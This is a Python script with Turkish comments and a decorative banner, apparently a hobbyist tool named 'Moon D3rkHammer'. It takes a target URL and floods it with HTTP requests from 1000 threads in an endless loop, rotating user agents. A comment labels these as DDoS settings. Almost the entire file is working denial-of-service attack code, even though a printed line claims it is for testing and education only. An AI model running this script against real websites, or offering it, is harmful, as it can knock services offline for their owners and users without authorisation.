from colorama import init, Fore, Style
import os
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor

# Renkli çıktı ayarları
init(autoreset=True)

# Konsolu temizleme
def clear():
    os.system("clear")

# Animasyonlu kalp ve banner
def animated_heart_banner():
    heart_shapes = [
        f"""
{Fore.RED}{Style.BRIGHT}       *****       *****
     *******     *******
    *********   *********
    *********** ***********
    ***********************
     *********************
      *******************
       *****************
        ***************
         *************
          ***********
           *********
            *******
             *****
              ***
               *
""",
        f"""
{Fore.MAGENTA}{Style.BRIGHT}       *****       *****
     *******     *******
    *********   *********
    *********** ***********
    ***********************
     *********************
      *******************
       *****************
        ***************
         *************
          ***********
           *********
            *******
             *****
              ***
               *
""",
        f"""
{Fore.YELLOW}{Style.BRIGHT}       *****       *****
     *******     *******
    *********   *********
    *********** ***********
    ***********************
     *********************
      *******************
       *****************
        ***************
         *************
          ***********
           *********
            *******
             *****
              ***
               *
"""
    ]

    # Kalp animasyonu
    for _ in range(3):
        for heart in heart_shapes:
            clear()
            print(heart)
            time.sleep(0.3)

    # Banner
    banner = f"""
{Fore.CYAN}{Style.BRIGHT}Dark
  _____             _      _    _                                     
 |  __ \           | |    | |  | |                                    
 | |  | | __ _ _ __| | __ | |__| | __ _ _ __ ___  _ __ ___   ___ _ __ 
 | |  | |/ _` | '__| |/ / |  __  |/ _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
 | |__| | (_| | |  |   <  | |  | | (_| | | | | | | | | | | |  __/ |   
 |_____/ \__,_|_|  |_|\_\ |_|  |_|\__,_|_| |_| |_|_| |_| |_|\___|_|   
                                                                      
                                                                      
"""
    print(banner)
    print(f"{Fore.MAGENTA}{Style.BRIGHT}==================== MOON D3RKHAMMER ====================\n")
    print(f"{Fore.YELLOW}Siber Güvenlik Odaklı Sürekli İstek Aracı")
    print(f"{Fore.GREEN}Not: Yalnızca test ve eğitim amaçlı kullanılmalıdır!")
    print(f"{Fore.MAGENTA}Geliştirici: Özgür\n")

    url = input(f"{Fore.CYAN}Hedef URL'yi girin: {Fore.RESET}")
    return url

# DDoS ayarları
THREADS = 1000
DELAY = 0.005
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile)"
]

# HTTP isteği gönderme
def send_request(i, url):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            print(Fore.GREEN + f"[{i}] Başarılı İstek Gönderildi!")
        else:
            print(Fore.YELLOW + f"[{i}] Sunucu Yanıtı: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[{i}] Hata: {e}")

# Flood fonksiyonu
def flood(url):
    i = 1
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        while True:
            executor.submit(send_request, i, url)
            i += 1
            time.sleep(DELAY)

# Program başlat
target_url = animated_heart_banner()
flood(target_url)
